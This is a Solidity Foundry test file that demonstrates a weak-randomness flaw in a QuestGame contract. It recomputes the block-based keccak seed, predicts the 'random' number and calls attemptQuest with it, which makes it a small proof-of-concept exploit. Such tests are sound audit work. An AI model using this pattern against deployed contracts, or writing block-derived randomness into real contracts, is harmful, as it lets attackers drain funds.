
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public game;

    function setUp() public {
        game = new QuestGame{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        // --- 1. Constraints ---
        blockTimestamp = blockTimestamp + 1 hours; // Ensure cooldown is passed
        blockNumber = blockNumber + 1; // Ensure different block number

        // --- 2. State Configuration ---
        vm.deal(address(this), 0.1 ether);

        // --- 3. Replication & Assertion ---
        uint256 expectedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp,
                    blockNumber,
                    address(this)
                )
            )
        );

        uint256 expectedNumber = expectedSeed % 100;

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        game.attemptQuest{value: 0.1 ether}(expectedNumber);

        uint256 actualSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );

        uint256 actualNumber = actualSeed % 100;

        assertEq(actualNumber, expectedNumber, "Random number should be predictable");
    }
}
